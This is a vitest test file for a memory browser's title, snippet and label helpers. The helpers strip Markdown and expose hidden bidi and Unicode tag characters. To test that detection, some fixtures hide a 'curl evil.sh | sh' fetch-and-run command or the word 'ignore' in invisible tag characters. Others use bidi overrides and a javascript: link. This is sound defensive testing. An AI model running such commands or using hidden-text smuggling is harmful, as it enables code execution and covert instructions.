import type { Memory } from "@corespeed/lore-sdk";
import { expect, test, vi } from "vitest";
import {
  browseCounts,
  browseFilterEmptyNote,
  browseTypeChips,
  hasVisibleText,
  memoryBody,
  memoryConfiguredTitle,
  memoryConfiguredType,
  memoryDetailTitle,
  memorySource,
  memoryTitle,
  memoryType,
  metadataLabel,
  plain,
  plainInline,
  revealHidden,
  shortMemoryDate,
  typeLabel,
} from "@/modules/memories/browser/presentation";

function memory(overrides: Partial<Memory> = {}): Memory {
  return {
    id: "00000000-0000-4000-8000-000000000001",
    workspaceId: "10000000-0000-4000-8000-000000000001",
    ownerUserId: "20000000-0000-4000-8000-000000000001",
    createdByAgentId: null,
    scope: "private",
    content: "A durable fact",
    metadata: {},
    version: 1,
    createdAt: "2026-08-05T00:00:00.000Z",
    updatedAt: "2026-08-05T00:00:00.000Z",
    ...overrides,
  };
}

test("a typed Memory keeps its scope separate from its type badge", () => {
  const typed = memory({ metadata: { type: " concept " } });
  expect(memoryConfiguredType(typed)).toBe("concept");
  expect(memoryType(typed)).toBe("concept");
  expect(typed.scope).toBe("private");

  const untyped = memory({ metadata: { type: "  " } });
  expect(memoryConfiguredType(untyped)).toBeNull();
  // Grouping still buckets untyped Memories by scope.
  expect(memoryType(untyped)).toBe("private");
});

test("a type or source stays as written as a key, and its label shows hidden controls as markers", () => {
  const marked = memory({ metadata: { type: "\u202Eeganam", source: " cli\u2066 " } });
  expect(memoryConfiguredType(marked)).toBe("\u202Eeganam");
  expect(memoryType(marked)).toBe("\u202Eeganam");
  expect(memorySource(marked)).toBe("cli\u2066");
  expect(metadataLabel("\u202Eeganam")).toBe("⟨U+202E⟩eganam");
  expect(typeLabel("field_\u2066note")).toBe("field ⟨U+2066⟩note");
  // A value written as a marker is a different key from the control it names.
  const literal = memory({ metadata: { type: "⟨U+202E⟩eganam" } });
  expect(memoryType(literal)).not.toBe(memoryType(marked));
  expect(memorySource(memory({ metadata: { source: 7 } }))).toBeNull();
  expect(memorySource(memory({ metadata: { source: " " } }))).toBeNull();
});

test("a type or source label shows at most 96 characters, whatever the metadata holds", () => {
  const long = "\u202E".repeat(99_000);
  const started = performance.now();
  const label = metadataLabel(long);
  expect(performance.now() - started).toBeLessThan(50);
  expect(label).toBe(`${"⟨U+202E⟩".repeat(96)}…`);
  expect(metadataLabel("x".repeat(96))).toBe("x".repeat(96));
});

// CI and most dev boxes run in UTC, where a local-time formatter also passes, so the
// module is reloaded under zones on each side of the date line to prove the UTC pin.
test.each(["Pacific/Kiritimati", "Pacific/Pago_Pago"])(
  "row dates are the UTC calendar day for a viewer in %s",
  async (zone) => {
    vi.stubEnv("TZ", zone);
    vi.resetModules();
    try {
      const { shortMemoryDate: formatInZone } = await import(
        "@/modules/memories/browser/presentation"
      );
      const utcDay = (day: number) =>
        new Intl.DateTimeFormat(undefined, {
          month: "short",
          day: "numeric",
          timeZone: "UTC",
        }).format(Date.UTC(2026, 7, day, 12));
      expect(formatInZone("2026-08-05T23:30:00.000Z")).toBe(utcDay(5));
      expect(formatInZone("2026-08-06T00:30:00.000Z")).toBe(utcDay(6));
    } finally {
      vi.unstubAllEnvs();
    }
  },
);

test("an unparseable row date renders nothing", () => {
  expect(shortMemoryDate("not a date")).toBe("");
});

test("a title taken from the first line shows its text, not its Markdown", () => {
  const titleOf = (content: string) => memoryTitle(memory({ content }));

  expect(titleOf("**corespeed-haas ClickHouse 托管与运维参考**\n\n现状")).toBe(
    "corespeed-haas ClickHouse 托管与运维参考",
  );
  expect(titleOf("## Use `bun run ch:migrate` for [[ops/clickhouse|ClickHouse]]")).toBe(
    "Use bun run ch:migrate for ClickHouse",
  );
  expect(titleOf("See [the runbook](https://example.test/runbook) first")).toBe(
    "See the runbook first",
  );
  // Underscore emphasis reads as its words, as the body renders it, but an
  // underscore inside a word and a lone asterisk are text.
  expect(titleOf("__init__.py loads a * b")).toBe("init.py loads a * b");
  expect(titleOf("## Rename snake_case_name, _then_ ship")).toBe(
    "Rename snake_case_name, then ship",
  );
  expect(titleOf("# 中文_注意_中文")).toBe("中文_注意_中文");
  // A configured title shows its text, as a first line does.
  expect(memoryTitle(memory({ content: "**x**", metadata: { title: "## **Set** title" } }))).toBe(
    "Set title",
  );
  // A configured title that is only markup still shows what was set.
  expect(memoryTitle(memory({ content: "x", metadata: { title: "****" } }))).toBe("****");
  // However long a configured title is, the title shows at most the limit.
  expect(memoryTitle(memory({ metadata: { title: "**".repeat(4_000) } }))).toBe(
    `${"*".repeat(95)}…`,
  );
});

test("plain text keeps a code span as written and drops the rest of the inline markup", () => {
  expect(plainInline("Run `**not bold**` and `[[not|link]]`")).toBe(
    "Run **not bold** and [[not|link]]",
  );
  // Strikethrough keeps its markers, the only sign that its words are struck.
  expect(plainInline("See ![the chart](https://example.test/c.png) and ~~old~~ *new*")).toBe(
    "See the chart and ~~old~~ new",
  );
  // A link with a title or with parentheses in its target reads as its label.
  expect(plainInline('See [docs](https://example.test "Docs") now')).toBe("See docs now");
  expect(plainInline("See [Foo](https://en.wikipedia.org/wiki/Foo_(bar)) now")).toBe("See Foo now");
  // An escape reads as the character it escapes, and an entity as the character it names.
  expect(plainInline("Use \\*args\\* and AT&amp;T")).toBe("Use *args* and AT&T");
  // A heading marker goes only at the start, and a link to another scheme stays.
  expect(plainInline("# Title # not a marker")).toBe("Title # not a marker");
  expect(plainInline("[x](javascript:alert(1))")).toBe("[x](javascript:alert(1))");
  // Spaced markers are text, and an underscore inside a word is never emphasis.
  expect(plainInline("2 * 3 * 4, a ** b, snake_case_name, _note_")).toBe(
    "2 * 3 * 4, a ** b, snake_case_name, note",
  );
});

test("plain text costs linear time on runs of brackets and markers", () => {
  for (const input of [
    "[".repeat(32_000),
    "[[a|".repeat(8_000),
    "![".repeat(16_000),
    "[a](".repeat(8_000),
    "*a".repeat(16_000),
    "_a".repeat(16_000),
    "`".repeat(32_000),
    "[a](http://(".repeat(2_600),
    '[a](https://x "'.repeat(2_000),
    "[a](<https://x ".repeat(2_000),
    "[a](https://x '".repeat(2_000),
  ]) {
    const started = performance.now();
    plainInline(input);
    plain(input);
    memoryTitle(memory({ content: input }));
    memoryBody(memory({ content: input }));
    // Linear time stays well under this on a slow machine; a quadratic cost takes seconds.
    expect(performance.now() - started).toBeLessThan(1_000);
  }
});

test("a search snippet drops block markers and inline markup, and reads code as its text", () => {
  expect(plain("# H\n**b** [[a/b|c]] `x`")).toBe("H b c x");
  expect(plain("> quoted\n- item\n2) second\n```ts\nconst x = 1;\n```\nend")).toBe(
    "quoted item second const x = 1; end",
  );
});

test("markers the body shows as text stay, and only markup it renders goes", () => {
  for (const text of ["keep **/src", "f(*args, **kwargs)"]) {
    expect(plainInline(text)).toBe(text);
  }
  // A label cut short keeps an opening marker whose pair was cut off, as the body would.
  expect(plainInline("**ci-runner controller service-account key: org-policy exception…")).toBe(
    "**ci-runner controller service-account key: org-policy exception…",
  );
});

test("Memory detail does not repeat a first line that is only its title", () => {
  const bodyOf = (content: string, metadata: Memory["metadata"] = {}) =>
    memoryBody(memory({ content, metadata }));

  expect(bodyOf("**Title**\n\nFirst paragraph.")).toBe("First paragraph.");
  expect(bodyOf("### Title\r\n\r\nBody")).toBe("Body");
  expect(bodyOf("**Title**")).toBe("");
  expect(bodyOf("**Title**\rBody")).toBe("Body");
  // The next line opens a block of its own: a list, a heading, a quote, or text.
  expect(bodyOf("【memory 统一用 Lore】\n- one")).toBe("- one");
  expect(bodyOf("**Owners**\n1. Alice")).toBe("1. Alice");
  expect(bodyOf("**Prefer code** (2026-09-18, review)\nBody")).toBe("Body");
  expect(bodyOf("【规范】（适用范围）\n正文")).toBe("正文");
  expect(bodyOf("**【规范】** 适用范围\n2026 plan")).toBe("2026 plan");
  // An ATX heading ends at its line, so whatever follows is the body's own.
  expect(bodyOf("# Title\n---\nBody")).toBe("---\nBody");
  expect(bodyOf("#\tTabbed heading\n    code")).toBe("    code");
});

test("a title line goes before a heading, a quote, or a list item of its own", () => {
  const bodyOf = (content: string) => memoryBody(memory({ content }));

  expect(bodyOf("**Title**\n## Section")).toBe("## Section");
  expect(bodyOf("**Title**\n#")).toBe("#");
  expect(bodyOf("**Title**\n> quoted")).toBe("> quoted");
  expect(bodyOf("**Title**\n1) one")).toBe("1) one");
  expect(bodyOf("【规范】\n+ plus")).toBe("+ plus");
  // An empty heading shows no words, so nothing is lost when it goes.
  expect(bodyOf("# \nBody")).toBe("Body");
  // A spaced break interrupts the paragraph either way, so the line may go.
  expect(bodyOf("**Title**\n- - -")).toBe("- - -");
});

test("the body keeps a first line the title would not show as written", () => {
  const kept = (content: string, metadata: Memory["metadata"] = {}) =>
    expect(memoryBody(memory({ content, metadata }))).toBe(content);

  // Not a title: plain text, a hashtag, seven hashes, a non-breaking space, an unclosed run.
  for (const line of [
    "A durable fact.",
    "#tag first",
    "####### seven",
    "# Title",
    "**unclosed title",
    "**【规范】 适用范围",
  ]) {
    kept(`${line}\nBody`);
  }
  // A configured title leaves the content whole.
  kept("# Heading\nBody", { title: "Configured" });
  // Markup past the title's own markers: links, code, bold, strikethrough, escapes,
  // entities, autolinks, and table pipes.
  for (const line of [
    "## [[ops/ch|ClickHouse]]",
    "**See [the runbook](https://example.test)**",
    "## Use `bun run ch:migrate`",
    '**Example** `\n[approved](https://example.test "hidden")\n`',
    "# Compute 2**3",
    "# Budget = 2 * 3 * 4 hours",
    "**Note** ~~old~~",
    "# AT&amp;T",
    "**x\\**",
    "# See <https://example.test/runbook>",
    "**Col** | Other\n| --- | --- |",
  ]) {
    kept(`${line}\nBody`);
  }
  // A next line that, without the title line above it, would parse differently.
  // Among them a setext underline, a number that could be a list marker, and an
  // empty list item, which could not open a list under the title line.
  for (const next of [
    "===",
    "---",
    "--",
    "    ssh prod",
    "\tindented",
    "2. Bob",
    "12. x",
    "2026. x",
    "1.",
    "1. ",
    "1.\t",
    "1)",
    "- ",
    "*",
    "|---|",
    "[rb]: x",
  ]) {
    kept(`**Title**\n${next}`);
  }
  // A title too long to show whole, or longer than the title reads.
  kept(`**${"x".repeat(97)}**\nBody`);
  kept(`# Deploy${" ".repeat(1_000)}only after the freeze lifts\nBody`);
});

test("a wikilink without a label reads as its reference", () => {
  expect(plainInline("Mail [the team](mailto:team@example.test)")).toBe("Mail the team");
  expect(plainInline("See [[ops/clickhouse]] and [[ops/ch|ClickHouse]]")).toBe(
    "See ops/clickhouse and ClickHouse",
  );
});

test("a blank or non-text configured title falls back to the first line, then to Untitled", () => {
  expect(memoryTitle(memory({ content: "# Heading\nBody", metadata: { title: "   " } }))).toBe(
    "Heading",
  );
  expect(memoryTitle(memory({ content: "First line", metadata: { title: 42 } }))).toBe(
    "First line",
  );
  expect(memoryTitle(memory({ content: "" }))).toBe("Untitled memory");
  // A first line whose words show nothing has no title to show.
  expect(memoryTitle(memory({ content: "# \nBody" }))).toBe("Untitled memory");
  expect(memoryTitle(memory({ content: "**\u200B**\nBody" }))).toBe("Untitled memory");
});

test("the title shows a first line whole only up to the limit, and the body agrees", () => {
  const whole = "x".repeat(96);
  expect(memoryTitle(memory({ content: `**${whole}**\nBody` }))).toBe(whole);
  expect(memoryBody(memory({ content: `**${whole}**\nBody` }))).toBe("Body");
  expect(memoryTitle(memory({ content: `**${"x".repeat(97)}**\nBody` }))).toBe(
    `${"x".repeat(95)}…`,
  );
  // Runs of whitespace count once, as the title shows them.
  const spaced = `# ${"ab   ".repeat(30).trim()}\nBody`;
  expect(memoryTitle(memory({ content: spaced })).endsWith("…")).toBe(false);
  expect(memoryBody(memory({ content: spaced }))).toBe("Body");
});

test("a title cut short never splits a character in two", () => {
  const title = memoryTitle(memory({ content: `# ${"x".repeat(94)}\u{1F600}tail\nBody` }));
  expect(title).toBe(`${"x".repeat(94)}…`);
  expect(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/.test(title)).toBe(false);
});

test("controls that reorder or hide text show as markers, and emoji stay whole", () => {
  expect(revealHidden("a‮b⁦c\u{E0049}d‬")).toBe("a⟨U+202E⟩b⟨U+2066⟩c⟨U+E0049⟩d⟨U+202C⟩");
  // A family (zero-width joiners), a heart (a variation selector), and right-to-left
  // marks are ordinary text.
  for (const text of ["\u{1F468}‍\u{1F469}‍\u{1F467}", "❤️", "שלום‏!"]) {
    expect(revealHidden(text)).toBe(text);
  }
  // Titles, labels, and snippets show them too, raw or as entities.
  expect(memoryTitle(memory({ content: "# Pay ‮4321 &#x202E;\nBody" }))).toBe(
    "Pay ⟨U+202E⟩4321 ⟨U+202E⟩",
  );
  expect(plain("Pay ‮4321")).toBe("Pay ⟨U+202E⟩4321");
});

test("tag characters after a flag that do not spell a flag still show as markers", () => {
  // Uppercase tags, a sequence with no cancel tag, and one too long for a subdivision.
  expect(revealHidden("\u{1F3F4}\u{E0041}\u{E0042}\u{E007F}")).toBe(
    "\u{1F3F4}⟨U+E0041⟩⟨U+E0042⟩⟨U+E007F⟩",
  );
  expect(revealHidden("\u{1F3F4}\u{E0067}\u{E0062}x")).toBe("\u{1F3F4}⟨U+E0067⟩⟨U+E0062⟩x");
  expect(revealHidden(`\u{1F3F4}${"\u{E0061}".repeat(7)}\u{E007F}`)).toBe(
    `\u{1F3F4}${"⟨U+E0061⟩".repeat(7)}⟨U+E007F⟩`,
  );
});

test("every bidi embedding, override, and isolate control shows as a marker, and its neighbours stay text", () => {
  for (const code of [
    0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2066, 0x2067, 0x2068, 0x2069, 0xe0001,
  ]) {
    const hex = code.toString(16).toUpperCase().padStart(4, "0");
    expect(revealHidden(`a${String.fromCodePoint(code)}b`)).toBe(`a⟨U+${hex}⟩b`);
  }
  for (const code of [0x2029, 0x202f, 0x2065, 0x206a, 0xe0080]) {
    const text = `a${String.fromCodePoint(code)}b`;
    expect(revealHidden(text)).toBe(text);
  }
});

test("only the three subdivision flags keep their tags; any other flag-shaped run shows", () => {
  const tags = (text: string) =>
    [...text]
      .map((character) => String.fromCodePoint(0xe0000 + (character.codePointAt(0) ?? 0)))
      .join("");
  for (const flag of ["gbeng", "gbsct", "gbwls"]) {
    const sequence = `\u{1F3F4}${tags(flag)}\u{E007F}`;
    expect(revealHidden(sequence)).toBe(sequence);
  }
  const smuggled = `\u{1F3F4}${tags("ignore")}\u{E007F}`;
  expect(revealHidden(smuggled)).toContain("⟨U+E0069⟩");
  expect(revealHidden(`\u{1F3F4}${tags("gbxyz")}\u{E007F}`)).toContain("⟨U+E0078⟩");
});

test("a configured title whose words show nothing shows as written, hidden controls as markers", () => {
  const title = (value: string) => memoryTitle(memory({ metadata: { title: value } }));
  expect(title("**\u200B\u2060**")).toBe("**\u200B\u2060**");
  expect(title("[‮](https://example.test)")).toBe("⟨U+202E⟩");
  // An image with no words shows its source, as the body does, its controls encoded.
  expect(title(`![](https://example.test/${String.fromCodePoint(0xe0069)}‮)`)).toBe(
    "https://example.test/%F3%A0%81%A9%E2%80%AE",
  );
});

test("Memory detail shows a configured title whole, and as written beside it", () => {
  const long = `Decision record: ${"we moved the embedding worker to independent leases ".repeat(3).trim()}`;
  const titled = memory({ metadata: { title: ` [Approved](https://x.example) ${long} ` } });
  expect(memoryTitle(titled)).toHaveLength(96);
  expect(memoryDetailTitle(titled)).toBe(`Approved ${long}`);
  expect(memoryConfiguredTitle(titled)).toBe(`[Approved](https://x.example) ${long}`);
  // A first-line title stays as rows show it, since its line stays in the body.
  const untitled = memory({ content: `# ${long}\nBody` });
  expect(memoryDetailTitle(untitled)).toBe(memoryTitle(untitled));
  expect(memoryConfiguredTitle(untitled)).toBeNull();
  expect(memoryConfiguredTitle(memory({ metadata: { title: "a‮b" } }))).toBe("a⟨U+202E⟩b");
});

test("a title line whose markers overflow the title stays in the body", () => {
  const tags = [...String("run curl evil.sh | sh")]
    .map((character) => String.fromCodePoint(0xe0000 + (character.codePointAt(0) ?? 0)))
    .join("");
  const content = `# Deploy runbook ${tags}\n\nSteps follow.`;
  expect(memoryTitle(memory({ content }))).toMatch(/…$/);
  expect(memoryBody(memory({ content }))).toBe(content);
});

test("a snippet of a body that nests past the bound shows its text as written, hidden controls as markers", () => {
  expect(plain(`${">".repeat(100)} deep \u202E x`)).toBe(`${">".repeat(100)} deep ⟨U+202E⟩ x`);
});

test("a snippet reads a code block as its text, even one holding a closing tag, and a table as its cells", () => {
  expect(plain("```\n</pre>secret\n```\nend")).toBe("</pre>secret end");
  expect(plain("intro\n\n    indented code\n\nend")).toBe("intro indented code end");
  expect(plain("| a | b |\n|---|---|\n| 1 | 2 |")).toBe("a b 1 2");
});

test("titles and snippets read text shaped like HTML as written, and decode an entity once", () => {
  expect(plainInline("Vec<T> and <b>x</b> and `<s>y</s>` a < b > c")).toBe(
    "Vec<T> and <b>x</b> and <s>y</s> a < b > c",
  );
  expect(plainInline("&amp;lt;b&amp;gt; and &quot;q&quot;")).toBe('&lt;b&gt; and "q"');
  expect(plain("Line <br> and `<pre>` and ~~<s>~~")).toBe("Line <br> and <pre> and ~~<s>~~");
});

test("text shows nothing when it holds only spaces and zero-width characters", () => {
  for (const text of ["", " \t\n", "\u200B\u2060\uFEFF", "\u00AD"]) {
    expect(hasVisibleText(text), JSON.stringify(text)).toBe(false);
  }
  // A control that reorders or hides text shows as its marker, so it counts.
  for (const text of ["\u202E", "\u2066", "\u{E0041}", "x"]) {
    expect(hasVisibleText(text), JSON.stringify(text)).toBe(true);
  }
});

test("Memory detail shows a configured title whose words show nothing whole, as written", () => {
  const blank = `**${"\u200B".repeat(200)}**`;
  expect(memoryDetailTitle(memory({ metadata: { title: blank } }))).toBe(blank);
  expect(memoryTitle(memory({ metadata: { title: blank } }))).toHaveLength(96);
});

test("Memory detail reads a configured title as long as metadata allows in linear time", () => {
  // Rows read 300 characters of a title, but detail reads all of it, up to the
  // 100,000-character metadata bound; quadratic parsing would take seconds here.
  const units = ["[", "![", "*a", "_a", "[[a|", "[a](http://(", "~~a", "<"];
  for (const title of [
    ...units.map((unit) => unit.repeat(Math.floor(99_000 / unit.length))),
    // A heading's closing run is found in linear time too.
    `# a${" ".repeat(99_000)}#x`,
    `# a${"\t".repeat(99_000)}#x`,
    `# a${"#".repeat(99_000)}x`,
  ]) {
    const started = performance.now();
    memoryDetailTitle(memory({ metadata: { title } }));
    expect(performance.now() - started, title.slice(0, 12)).toBeLessThan(1_000);
  }
  expect(memoryDetailTitle(memory({ metadata: { title: "[".repeat(99_000) } }))).toHaveLength(
    99_000,
  );
});

test("a snippet of a chunk cut inside a fence or a list item keeps its words", () => {
  // Search evidence is one chunk of a Memory, which may start inside a fence: its
  // closing line then opens one, and what follows reads as code.
  const inFence = "  const value36 = compute(36);\n```\n\nRotate the credentials every Friday.";
  expect(plain(inFence)).toBe("const value36 = compute(36); Rotate the credentials every Friday.");
  // A chunk that starts with an item's indented continuation reads it as code.
  expect(plain("    Details for step 10: rotate keys.\n\n11. Next")).toBe(
    "Details for step 10: rotate keys. Next",
  );
});

test("a heading title reads as markdown-it reads it, indented or closed", () => {
  expect(memoryTitle(memory({ content: "## Title ##\nBody" }))).toBe("Title");
  expect(memoryTitle(memory({ content: "   # Title\nBody" }))).toBe("Title");
  expect(memoryTitle(memory({ content: "  ## Heading ##\nBody" }))).toBe("Heading");
  expect(memoryTitle(memory({ content: "# C# and F#\nBody" }))).toBe("C# and F#");
  expect(memoryTitle(memory({ content: "# Title \\#\nBody" }))).toBe("Title #");
  expect(memoryTitle(memory({ content: "#\nBody" }))).toBe("Untitled memory");
  expect(memoryTitle(memory({ content: "#hashtag\nBody" }))).toBe("#hashtag");
});

test("a title whose source runs past what it reads says it was cut", () => {
  // Padding past what a title reads still leaves a sign that words follow, and the
  // line stays in the body, where they show.
  const padded = memory({
    content: `# Deploy${" ".repeat(1_000)}only after the freeze lifts\nBody`,
  });
  expect(memoryTitle(padded)).toBe("Deploy…");
  expect(memoryBody(padded)).toBe(padded.content);
  // Words that reduce to fewer than the title shows still end in "…" when cut.
  const cut = memoryTitle(memory({ metadata: { title: `**Owner:** ${"&amp;".repeat(100)}` } }));
  // The cut may split an entity, whose start then shows as written.
  expect(cut.startsWith("Owner: &&")).toBe(true);
  expect(cut.endsWith("…")).toBe(true);
  expect(cut.length).toBeLessThan(96);
  // The cut falls between the halves of the emoji at 299, which it keeps whole or drops.
  const lone = /[\uD800-\uDBFF](?![\uDC00-\uDFFF])/;
  const astral = memoryTitle(
    memory({ metadata: { title: `${"&amp;".repeat(59)}abcd\u{1F600}tail` } }),
  );
  expect(lone.test(astral)).toBe(false);
  expect(astral.endsWith("…")).toBe(true);
});

test("a title never reads an indented code line or a non-ASCII space after # as a heading", () => {
  for (const line of ["    # Code line", "\t# Code line", "#\u00A0Code line", "#\u3000Code line"]) {
    expect(memoryTitle(memory({ content: `${line}\nBody` })), JSON.stringify(line)).toMatch(
      /^# Code line$/,
    );
  }
  const titled = memory({ metadata: { title: "# A\nB" } });
  expect(memoryTitle(titled)).toBe(memoryDetailTitle(titled));
});

test("a title or label with no markup still shows hidden controls as markers", () => {
  expect(plainInline("Pay \u202E4321")).toBe("Pay ⟨U+202E⟩4321");
  expect(memoryTitle(memory({ content: "Pay \u202E4321\nBody" }))).toBe("Pay ⟨U+202E⟩4321");
  expect(memoryTitle(memory({ metadata: { title: "a\u2066b" } }))).toBe("a⟨U+2066⟩b");
});

test("a snippet shows at most 200 characters of at most 2,000 read, never splitting a character", () => {
  const lone = /[\uD800-\uDBFF](?![\uDC00-\uDFFF])/;
  expect(plain("x".repeat(500))).toHaveLength(200);
  expect(lone.test(plain(`${"x".repeat(199)}\u{1F600} tail`))).toBe(false);
  expect(lone.test(plain(`${"#\n".repeat(999)}#${"\u{1F600}"}`))).toBe(false);
  // Empty headings show no words, so what lies past 2,000 characters would show if read.
  expect(plain(`${"#\n".repeat(1_000)}SECRET`)).toBe("");
});

test("a row title parses once per Memory, and a hostile first line costs a bounded parse", () => {
  const rows = Array.from({ length: 200 }, (_, index) =>
    memory({ id: String(index), content: `${"![".repeat(1_000)}${index}` }),
  );
  const first = performance.now();
  for (const row of rows) memoryTitle(row);
  expect(performance.now() - first).toBeLessThan(2_000);
  const again = performance.now();
  for (const row of rows) memoryTitle(row);
  expect(performance.now() - again).toBeLessThan(20);
});

test("browse counts are lower bounds until every browse page is read", () => {
  expect(
    browseCounts({ matching: 1200, total: 1200, filtered: false, complete: true }).heading,
  ).toBe("Showing 1,200 memories");
  const filling = browseCounts({ matching: 40, total: 300, filtered: true, complete: false });
  expect(filling.heading).toBe("Showing 40+ of 300+ memories");
  expect(filling.count(300)).toBe("300+");
  const done = browseCounts({ matching: 40, total: 300, filtered: true, complete: true });
  expect(done.heading).toBe("Showing 40 of 300 memories");
  expect(done.count(0)).toBe("0");
});

test("the browse header's noun agrees with the count beside it", () => {
  expect(browseCounts({ matching: 1, total: 1, filtered: false, complete: true }).heading).toBe(
    "Showing 1 memory",
  );
  expect(browseCounts({ matching: 1, total: 1, filtered: true, complete: true }).heading).toBe(
    "Showing 1 of 1 memory",
  );
  expect(browseCounts({ matching: 0, total: 3, filtered: true, complete: true }).heading).toBe(
    "Showing 0 of 3 memories",
  );
  // "1+" is a lower bound, so it stays plural.
  expect(browseCounts({ matching: 1, total: 1, filtered: false, complete: false }).heading).toBe(
    "Showing 1+ memories",
  );
});

test("an unfiltered browse header is a lower bound while pages load or at the browse cap", () => {
  const capped = browseCounts({ matching: 5000, total: 5000, filtered: false, complete: false });
  expect(capped.heading).toBe("Showing 5,000+ memories");
  expect(capped.count(5000)).toBe("5,000+");
});

test("the active type filter keeps its chip even when no loaded Memory has that type", () => {
  const keys = (types: string[], filter: string) =>
    browseTypeChips(types, filter).map(([key]) => key);
  // Preferred types first, then the rest alphabetically, each once.
  expect(keys(["private", "concept", "private"], "all")).toEqual(["all", "concept", "private"]);
  // An unloaded active filter joins the list in the same order.
  expect(keys(["private", "concept"], "field_note")).toEqual([
    "all",
    "concept",
    "field_note",
    "private",
  ]);
  // A loaded active filter is not added twice.
  expect(keys(["concept", "field_note"], "concept")).toEqual(["all", "concept", "field_note"]);
  expect(browseTypeChips([], "field_note").at(-1)).toEqual(["field_note", "field note"]);
  // Preferred types keep their fixed order ahead of the rest, even against the alphabet.
  expect(keys(["alpha", "company", "concept", "product"], "all")).toEqual([
    "all",
    "concept",
    "product",
    "company",
    "alpha",
  ]);
  expect(keys(["alpha"], "person")).toEqual(["all", "person", "alpha"]);
});

test("a type filter with no loaded match names the type, and says 'yet' only while pages load", () => {
  const note = (
    input: { complete: boolean; capped: boolean; stopped: boolean },
    type = "field_note",
  ) => browseFilterEmptyNote({ type, matching: 0, window: 5000, ...input });
  const loading = { complete: false, capped: false, stopped: false };
  expect(note({ ...loading, complete: true })).toBe("No “field note” Memories.");
  expect(note(loading)).toBe("No “field note” Memories have loaded yet.");
  // At the cap, or after a page failed, loading has stopped, so there is no "yet".
  expect(note({ ...loading, capped: true })).toBe("No “field note” Memories in the first 5,000.");
  expect(note({ ...loading, stopped: true })).toBe("No “field note” Memories among those loaded.");
  // An untyped Memory's type is its scope, so a scope bucket is named as untyped.
  expect(note({ ...loading, complete: true }, "private")).toBe("No untyped “private” Memories.");
  expect(
    browseFilterEmptyNote({ type: "field_note", matching: 3, window: 5000, ...loading }),
  ).toBeNull();
  expect(browseFilterEmptyNote({ type: "all", matching: 0, window: 5000, ...loading })).toBeNull();
});
